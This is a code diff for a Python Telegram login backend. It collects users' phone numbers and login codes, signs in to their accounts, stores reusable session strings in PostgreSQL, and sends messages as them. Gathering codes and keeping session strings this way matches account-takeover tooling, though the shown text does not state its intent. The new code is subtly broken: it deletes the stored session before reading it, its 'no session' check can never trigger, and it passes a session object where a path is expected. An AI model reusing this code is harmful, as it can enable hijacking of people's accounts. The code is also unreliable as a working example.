@@ -6,6 +6,7 @@ from telethon.errors import (
     PhoneCodeInvalidError,
     RPCError,
 )
+from telethon.sessions import StringSession
 from quart import Quart, request, jsonify
 from quart_cors import cors
 import asyncio
@@ -60,11 +61,11 @@ CREATE TABLE IF NOT EXISTS users (
     session_path TEXT
 )
 """)
+
 db_cursor.execute("""
-CREATE TABLE IF NOT EXISTS channels (
-    chat_id BIGINT,
-    channel_url TEXT,
-    PRIMARY KEY (chat_id, channel_url)
+CREATE TABLE IF NOT EXISTS telegram_sessions (
+    chat_id BIGINT PRIMARY KEY,
+    session_data TEXT NOT NULL
 )
 """)
 db_conn.commit()
@@ -98,21 +99,34 @@ def save_user_to_db(chat_id, phone, session_path):
     # Call the function to check table contents
     check_table_content()
 
-def get_session_for_user(chat_id):
-    db_cursor.execute("SELECT session_path FROM users WHERE chat_id = %s", (chat_id,))
+# Save session to PostgreSQL
+def save_session_to_db(chat_id, session_string):
+    query = """
+        INSERT INTO telegram_sessions (chat_id, session_data)
+        VALUES (%s, %s)
+        ON CONFLICT (chat_id) DO UPDATE
+        SET session_data = EXCLUDED.session_data;
+    """
+    db_cursor.execute(query, (chat_id, session_string))
+    db_conn.commit()
+    print(f"Session for chat_id {chat_id} saved successfully.")
+
+# Retrieve session from PostgreSQL
+def get_session_from_db(chat_id):
+    query = "SELECT session_data FROM telegram_sessions WHERE chat_id = %s;"
+    db_cursor.execute(query, (chat_id,))
     result = db_cursor.fetchone()
+    if result:
+        print(f"Session for chat_id {chat_id} retrieved successfully.")
     return result[0] if result else None
 
-# Example Usage
-# save_user_to_db(7905915877, "+2348064801910", "session_+2348064801910")
-# print(get_session_for_user(7905915877))
+# Delete session from PostgreSQL
+def delete_session_from_db(chat_id):
+    query = "DELETE FROM telegram_sessions WHERE chat_id = %s;"
+    db_cursor.execute(query, (chat_id,))
+    db_conn.commit()
+    print(f"Session for chat_id {chat_id} deleted successfully.")
 
-
-# Function to delete session file (forcefully delete session)
-def delete_session(phone):
-    session_file = os.path.join(os.getcwd(), f'session_{phone}.session')
-    if os.path.exists(session_file):
-        os.remove(session_file)
 
 # New function to send a message after successful login
 async def send_message(user_client):
@@ -257,18 +271,24 @@ async def request_code():
         return jsonify({'error': 'Phone number and chat ID are required'}), 400
     
     # Delete any existing session before starting a new login attempt
-    delete_session(phone)
+    delete_session_from_db(chat_id)
 
-    user_client = TelegramClient(f'session_{phone}', api_id, api_hash)
+     # Try to retrieve the session from the database
+    session_string = get_session_from_db(chat_id)
+    session = StringSession(session_string) if session_string else StringSession()
+
+    # Initialize the Telegram client
+    print("Starting client...")
+    user_client = TelegramClient(session, api_id, api_hash)
     try:
         await user_client.connect()
         sent_code = await user_client.send_code_request(phone)
         return jsonify({'message': 'Login code sent', 'phone_code_hash': sent_code.phone_code_hash})
     except RPCError as e:
-        delete_session(phone)
+        delete_session_from_db(chat_id)
         return jsonify({'error': f'RPC error: {e}'}), 500
     except Exception as e:
-        delete_session(phone)
+        delete_session_from_db(chat_id)
         return jsonify({'error': f'Error: {e}'}), 500
     finally:
         await user_client.disconnect()
@@ -288,7 +308,13 @@ async def verify_code():
     if not phone or not code or not phone_code_hash or not chat_id:
         return jsonify({'error': 'Phone, code, phone_code_hash, and chat_id are required'}), 400
 
-    user_client = TelegramClient(f'session_{phone}', api_id, api_hash)
+     # Try to retrieve the session from the database
+    session_string = get_session_from_db(chat_id)
+    session = StringSession(session_string) if session_string else StringSession()
+
+    # Initialize the Telegram client
+    print("Starting client...")
+    user_client = TelegramClient(session, api_id, api_hash)
     try:
         await user_client.connect()
         await user_client.sign_in(phone, code, phone_code_hash=phone_code_hash)
@@ -300,22 +326,22 @@ async def verify_code():
                 return jsonify({'error': 'Two-factor authentication required'}), 403
 
         # Save user session
-        session_path = f'session_{phone}'
-        user_client.session.save()
-        save_user_to_db(chat_id, phone, session_path)
+         # Save the session back to the database
+        save_session_to_db(chat_id, user_client.session.save())
+        save_user_to_db(chat_id, phone, session)
 
         # Send a message after successful login
         await send_message(user_client)
 
         return jsonify({'message': 'Login successful and action performed'})
     except PhoneCodeInvalidError:
-        delete_session(phone)
+        delete_session_from_db(chat_id)
         return jsonify({'error': 'Invalid login code'}), 400
     except SessionPasswordNeededError:
-        delete_session(phone)
+        delete_session_from_db(chat_id)
         return jsonify({'error': 'Two-factor authentication required'}), 403
     except Exception as e:
-        delete_session(phone)
+        delete_session_from_db(chat_id)
         return jsonify({'error': f'Error: {e}'}), 500
     finally:
         await user_client.disconnect()
@@ -334,11 +360,13 @@ async def trigger_send_message():
     
     try:
         # Reuse the existing session if available
-        session_path = get_session_for_user(chat_id)
-        if not session_path:
+        # Try to retrieve the session from the database
+        session_string = get_session_from_db(chat_id)
+        session = StringSession(session_string) if session_string else StringSession()
+        if not session:
             return jsonify({'error': 'No session found for this user'}), 404
 
-        user_client = TelegramClient(session_path, api_id, api_hash)
+        user_client = TelegramClient(session, api_id, api_hash)
         await user_client.connect()
 
         if not await user_client.is_user_authorized():
